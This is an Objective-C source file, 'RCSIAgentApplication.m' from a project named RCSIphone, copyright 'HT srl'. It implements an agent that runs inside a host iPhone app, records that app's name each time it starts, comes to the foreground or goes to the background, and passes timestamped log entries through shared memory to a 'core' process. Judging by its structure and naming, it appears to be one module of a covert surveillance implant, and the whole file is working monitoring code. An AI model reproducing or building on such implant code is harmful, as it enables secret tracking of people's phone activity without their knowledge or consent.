//
//  RCSIAgentApplication.m
//  RCSIphone
//
//  Created by kiodo on 12/3/10.
//  Copyright 2010 HT srl. All rights reserved.
//

#import "RCSIAgentApplication.h"

#import <UIKit/UIApplication.h>
#import "RCSISharedMemory.h"
#import "RCSICommon.h"

#define TM_SIZE (sizeof(struct tm) - sizeof(long) - sizeof(char*))
#define PROC_START @"START"
#define PROC_STOP  @"STOP"
#define LOG_DELIMITER 0xABADC0DE

//#define DEBUG

@implementation agentApplication

- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus
{
  struct timeval tp;
  NSData *processName       = [mProcessName dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *pStatus           = [aStatus dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData  = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp            = gmtime(&rawtime);
  tmTemp->tm_year   += 1900;
  tmTemp->tm_mon    ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  [entryData appendBytes: (const void *)tmTemp
                  length: 36];//sizeof (struct tm) - TM_SIZE];
  
  // Process Name
  [entryData appendData: processName];
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Status of process
  [entryData appendData: pStatus];
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // No process desc: Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimeter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  gettimeofday(&tp, NULL);
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = LOG_APPLICATION;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob:logData];  
  
  [logData release];
  [entryData release];
  
  return YES;
}

- (BOOL)grabInfo: (NSString*)aStatus
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  NSBundle *bundle = [NSBundle mainBundle];
  
  NSDictionary *info = [bundle infoDictionary];
  
  mProcessName = (NSString*)[[info objectForKey: (NSString*)kCFBundleExecutableKey] copy];
  mProcessDesc = @"";
  
  [self writeProcessInfoWithStatus: aStatus];
  
  [pool release];
  
  return YES;
}

- (void)sendStartLog
{
  if (isAppStarted == YES) 
    [self grabInfo: PROC_START];
}

- (void)sendStopLog
{
  if (isAppStarted == YES)
    [self grabInfo: PROC_STOP];
}

- (void)agentRunLoop
{
  while (mAgentStatus == AGENT_STATUS_RUNNING) 
    { 
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
      [pool release];
    }
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    mAgentID = AGENT_APPLICATION;
  
  return self;
}

- (BOOL)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
    {
      [self setMAgentStatus: AGENT_STATUS_RUNNING];
    
      [self grabInfo: PROC_START];
          
      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(sendStartLog)
                                                   name: @"UIApplicationWillEnterForegroundNotification"
                                                 object: nil];

      NSString *majVer = [[[UIDevice currentDevice] systemVersion] substringToIndex:1];
    
      if ([majVer compare: @"3"] == NSOrderedSame)
        {
          [[NSNotificationCenter defaultCenter] addObserver: self
                                                   selector: @selector(sendStopLog)
                                                       name: @"UIApplicationWillTerminateNotification"
                                                     object: nil];
        }
      else
        {  
          [[NSNotificationCenter defaultCenter] addObserver: self
                                                   selector: @selector(sendStopLog)
                                                       name: @"UIApplicationDidEnterBackgroundNotification"
                                                     object: nil];
        }
      
      sleep(1);
      
      isAppStarted = YES;
    }
  
  [outerPool release];
  
  return YES;
}

- (void)stop
{
  [[NSNotificationCenter defaultCenter] removeObserver:self];
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  isAppStarted = NO;
}

@end

